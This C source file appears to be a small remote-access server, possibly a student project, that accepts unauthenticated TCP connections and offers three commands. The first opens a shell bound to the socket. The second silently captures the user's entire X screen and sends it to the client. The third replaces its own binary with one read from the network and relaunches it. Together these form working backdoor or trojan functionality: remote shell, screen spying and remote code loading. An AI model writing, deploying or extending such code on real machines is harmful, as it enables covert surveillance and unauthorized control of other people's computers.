#include "server.h"

static int socket_serveur;

// COPY DATA FROM INPUT DESCRIPTOR TO OUTPUT DESCRIPTOR
int copy(int output_fd, int input_fd)
{
	char buffer[BUF_SIZE];
	int n = 0;
	while((n = read(input_fd, buffer, BUF_SIZE)) > 0)
		if(write(output_fd, buffer , n) < 0){
			perror("copy");
			exit(1);
		}
	return 1;
}

//TAKE AND SEND SCREENSHOT TO CLIENT THROUGH SOCKET
void screenshot(int socket_client) {
	Display *disp;
	Window root;
	cairo_surface_t *surface;
	int scr;

	disp = XOpenDisplay(NULL);
	scr = DefaultScreen(disp);
	root = DefaultRootWindow(disp);

	surface = cairo_xlib_surface_create(disp, root, DefaultVisual(disp, scr),
			DisplayWidth(disp, scr), DisplayHeight(disp, scr));
	cairo_surface_write_to_png(
			surface,
			SCREEN_FILE);
	int fd = open(SCREEN_FILE, O_RDONLY);
	if(fd < 0){
		perror(SCREEN_FILE);
		exit(1);
	}
	copy(socket_client, fd);
	cairo_surface_destroy(surface);
}

//RETURN CHOICE MADE BY THE CLIENT
int get_client_choice(FILE *f){
	int choix = 0;
	char buffer[255];
	while(choix == 0){
		if(fgets(buffer, BUF_SIZE, f) != NULL){
			int i;
			for(i = 1; i < 4; i++){
				if(strchr(buffer, i + '0') != NULL)
					choix = i;
			}
		}
	}
	return choix;
}


//EXECUTE SHELL
void shell(int socket){
	if(fork() == 0){
		close(0);
		dup(socket);
		close(1);
		dup(socket);
		close(2);
		dup(socket);
		char* arg[] = {SHELL_CMD, NULL};
		execvp(arg[0], arg);
	} else {
		wait(NULL);
	}
}

//RE-RUN SERVER (NEEDED BY UPDATE)
void run_latest(){
	char execname[20];
	sprintf(execname, "%s%s", "./", NAME);
	if(strlen(execname) > 0){
		kill(getppid(), SIGTERM);
		sleep(3);	
		char* arg[] = {execname, NULL};
		execvp(arg[0], arg);
	}
}

//UPDATE THE SERVER WITH NEW ONE READ IN SOCKET
void update_server(int in_fd){
	char *filename = NAME;
	int fd = open(filename, O_CREAT | O_WRONLY, 0777);
	copy(fd, in_fd);
	close(fd);
	close(in_fd);
	close(socket_serveur);
	run_latest();
}


//HANDLE THE CLIENT SOCKET
void handle_client(int socket){
	FILE *f = fdopen(socket, "r+");
	switch(get_client_choice(f)){
		case 1:
			//printf("He choose shell\n");
			shell(socket);			
		break;
		case 2:
			//printf("He choose screenshot\n");
			screenshot(socket);			
		break;
		case 3:
			//printf("He choose update\n");
			update_server(socket);
	}
}
int main() {
	initialiser_signaux();
	socket_serveur = creer_serveur(SERVER_PORT);
	if(socket_serveur == -1)
		return 1;

	int socket_client;
        while(1){
            socket_client = accept(socket_serveur, NULL, NULL);
            if (socket_client == -1){
                perror("accept");
                return 1;
            }
            if(fork() == 0){
                handle_client(socket_client);

                close(socket_client);
                return 1;
            } else {
                close(socket_client);
            }
        }
        close(socket_serveur);

        return 0;
}
